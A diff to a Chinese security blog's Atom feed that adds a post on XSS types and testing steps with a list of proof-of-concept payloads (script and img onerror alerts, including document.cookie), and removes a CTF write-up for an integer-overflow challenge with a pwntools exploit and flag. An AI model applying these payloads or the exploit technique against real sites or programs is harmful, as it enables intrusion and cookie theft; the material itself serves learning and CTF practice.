@@ -86,6 +86,28 @@
   </entry>
   
   <entry>
+    <title>有关XSS跨站脚本</title>
+    <link href="https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/%E6%9C%89%E5%85%B3XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC/"/>
+    <id>https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/%E6%9C%89%E5%85%B3XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC/</id>
+    <published>2022-08-09T04:10:35.381Z</published>
+    <updated>2022-08-09T04:10:16.791Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="XSS-跨站脚本-原理与分类"><a href="#XSS-跨站脚本-原理与分类" class="headerlink" title="XSS(跨站脚本)原理与分类"></a>XSS(跨站脚本)原理与分类</h1><p>跨站脚本攻击XSS,为了不和层叠样式表的缩写混淆，故将跨站脚本攻击缩写为XSS,恶意攻击者往web页面里插入恶意script代码，当用户浏览页面时嵌入其中的script代码被执行，从而恶意攻击用户。</p><p>XSS攻击针对的是用户层面的攻击.</p><ul><li>反射型：交互的数据一般不会被存在数据库里，一次性，一般出现在查询页面等。</li><li>存储型：交互的数据会被存在数据库里面，永久性存储，一般出现在留言板，注册等页面。</li><li>DOM型：不与后台服务器产生数据交互，是一种通过DOM操作前端代码输出的时候产生的问题，一次性，也属于反射型。</li></ul><h1 id="XSS漏洞测试流程"><a href="#XSS漏洞测试流程" class="headerlink" title="XSS漏洞测试流程"></a>XSS漏洞测试流程</h1><p>1.在目标上找输入点，比如查询接口、留言板</p><p>2.输入一组“特殊字符（&gt;,’,”等）+唯一识别字符”，点击提交后，查看返回源码，看后端返回数据是否有处理。</p><p>3.通过搜索定位到唯一字符，结合唯一字符前后语法确定是否可以构造执行js的调教（构造闭合）</p><p>4.提交构造的脚本代码（以及各种绕过姿势），看是否可以成功执行，成功执行证明存在xss漏洞。</p><h1 id="XSS的攻击载荷"><a href="#XSS的攻击载荷" class="headerlink" title="XSS的攻击载荷"></a>XSS的攻击载荷</h1><ul><li><code>&lt;script&gt;</code>：最直接的xss有效载荷，脚本标记可以引用外部的javascript代码，也可以将代码插入脚本标记中。</li></ul><figure class="highlight plaintext"><figcaption><span>src</span></figcaption><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs <script">&lt;script&gt;alert("hack")&lt;/script&gt; #弹出hack<br>&lt;script&gt;alert(document.cookie)&lt;/script&gt; #弹出cookie<br></code></pre></td></tr></tbody></table></figure><ul><li><code>&lt;img&gt;</code>：<figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;img  <span class="hljs-attribute">src</span>=1  <span class="hljs-attribute">onerror</span>=alert("hack")&gt;<br>&lt;img  <span class="hljs-attribute">src</span>=1  <span class="hljs-attribute">onerror</span>=alert(/hack/)&gt;<br>&lt;img  <span class="hljs-attribute">src</span>=1  <span class="hljs-attribute">onerror</span>=alert(document.cookie)&gt;  #弹出cookie<br>&lt;img  <span class="hljs-attribute">src</span>=1  <span class="hljs-attribute">onerror</span>=alert(123)&gt;      注：对于数字，可以不用引号<br>&lt;img  <span class="hljs-attribute">src</span>=<span class="hljs-string">"javascript:alert("</span>XSS");"&gt;<br>&lt;img  <span class="hljs-attribute">dynsrc</span>=<span class="hljs-string">"javascript:alert('XSS')"</span>&gt;<br>&lt;img  <span class="hljs-attribute">lowsrc</span>=<span class="hljs-string">"javascript:alert('XSS')"</span>&gt;<br></code></pre></td></tr></tbody></table></figure></li></ul>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;XSS-跨站脚本-原理与分类&quot;&gt;&lt;a href=&quot;#XSS-跨站脚本-原理与分类&quot; class=&quot;headerlink&quot; title=&quot;XSS(跨站脚本)原理与分类&quot;&gt;&lt;/a&gt;XSS(跨站脚本)原理与分类&lt;/h1&gt;&lt;p&gt;跨站脚本攻击XSS,为了不和层叠样式表的缩写</summary>
+      
+    
+    
+    
+    
+    <category term="XSS" scheme="https://github.com/SinkyQ/sinkyhexo.github.io.git/tags/XSS/"/>
+    
+  </entry>
+  
+  <entry>
     <title>攻防世界-dice_game</title>
     <link href="https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn-dice_game/"/>
     <id>https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn-dice_game/</id>
@@ -449,28 +471,6 @@
     
     
     <category term="漏洞" scheme="https://github.com/SinkyQ/sinkyhexo.github.io.git/tags/%E6%BC%8F%E6%B4%9E/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>攻防世界 int_overflow</title>
-    <link href="https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn-int_overflow/"/>
-    <id>https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn-int_overflow/</id>
-    <published>2022-08-09T03:17:04.192Z</published>
-    <updated>2020-09-10T07:29:14.007Z</updated>
-    
-    <content type="html"><![CDATA[<h3 id="checksec-查看保护机制"><a href="#checksec-查看保护机制" class="headerlink" title="checksec 查看保护机制"></a>checksec 查看保护机制</h3><p><img src="https://i.loli.net/2020/05/08/65ugNXJH9UezRwD.png" alt="捕获.PNG"></p><p>可直接使用栈溢出；基地址不变化；栈中数据有执行权限；</p><h3 id="分析思路"><a href="#分析思路" class="headerlink" title="分析思路"></a>分析思路</h3><p>32位文件，按流程查看程序，main()无突破点。</p><p>进入login(),限制username长度最大0x19;限制passwd长度最大0x199；</p><p>进入check_passwd()，v3存储passwd长度，满足if语句3&lt;v3&lt;=8可跳到else语句。</p><blockquote><p>此处有突破点：v3类型为unsigned __int8,，取值范围0~255，而v3存储的passwd最大为0x199,即409.远大于v3取值范围。此处为典型整数溢出。</p></blockquote><p>综上:if语句中的v3范围为（3,8]或[259,264] （最大为255，若使其溢出，则需再加四字节，__int8 是指8bit）</p><p>溢出之后到达else语句，函数返回  strcpy(dest,s)，dest为字符串拷贝目的栈，长度为0x14。</p><p><img src="https://i.loli.net/2020/05/08/7oCFMwki9HutVlr.png" alt="17627983-0f96bbadb310adc5.png"></p><p>在字符串中发现cat flag,属于函数 what_is_this()，地址为0x0804868B.</p><h3 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h3><p>可以利用栈溢出，令passwd直接覆盖dest,直接使函数返回what_is_this()。</p><p>在字符拷贝过程中，输入0x14个字符，可覆盖函数返回地址，具体是否为0x14个字符，现在查看汇编语言：</p><p><img src="https://i.loli.net/2020/05/08/fwHUd4pY5bWSnEN.png" alt="17627983-255df211907024ca.png"></p><p><img src="https://i.loli.net/2020/05/08/a9sNLkX6R5ve8G4.png" alt="17627983-73596713043662d6.png"></p><p>在字符串拷贝前，先将拷贝原地址和目的地址压入堆栈，在函数最开始压入ebp变量，在函数结尾存在leave指令，在32位程序中，leave指令等于mov esp,ebp和pop ebp。即：<strong>在覆盖函数返回地址前，还有一次出栈操作，数值4字节。即覆盖之前还需将这4字节覆盖。</strong>随机选取数值262.<br>（what_is_this()函数的地址为4字节）</p><p>262-0x14-4-4=234</p><p>或者，我在gdb中调试程序，在strcpy下断点，passwd填上‘a’*262，观察到ebp值为4字节。</p><p><img src="https://i.loli.net/2020/05/08/c84MRnrbJZA1zFH.png" alt="捕获.PNG"></p><p>exp:</p><figure class="highlight vim"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs vim">from pwn import*<br><span class="hljs-keyword">sh</span>=remote(<span class="hljs-string">'111.198.29.45'</span>,<span class="hljs-number">39118</span>)<br><span class="hljs-keyword">sh</span>.recvuntil(<span class="hljs-string">'Your choice:'</span>)<br>flag=<span class="hljs-number">0</span>x0804868B<br><span class="hljs-keyword">sh</span>.sendline(<span class="hljs-string">'1'</span>)<br><span class="hljs-keyword">sh</span>.recvuntil(<span class="hljs-string">'username:'</span>)<br><span class="hljs-keyword">sh</span>.sendline(<span class="hljs-string">'z'</span>)<br><span class="hljs-keyword">sh</span>.recvuntil(<span class="hljs-string">'passwd:'</span>)<br>payload=<span class="hljs-string">'a'</span>*<span class="hljs-number">0</span>x14+<span class="hljs-string">'aaaa'</span>+p32(flag)+<span class="hljs-string">'a'</span>*<span class="hljs-number">234</span><br><span class="hljs-keyword">sh</span>.sendline(payload)<br><span class="hljs-keyword">sh</span>.interactive()<br></code></pre></td></tr></tbody></table></figure><p>cyberpeace{2a2d92a084e034be9c3a03bbab4f149b}</p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h3 id=&quot;checksec-查看保护机制&quot;&gt;&lt;a href=&quot;#checksec-查看保护机制&quot; class=&quot;headerlink&quot; title=&quot;checksec 查看保护机制&quot;&gt;&lt;/a&gt;checksec 查看保护机制&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;https://</summary>
-      
-    
-    
-    
-    
-    <category term="pwn" scheme="https://github.com/SinkyQ/sinkyhexo.github.io.git/tags/pwn/"/>
     
   </entry>
   
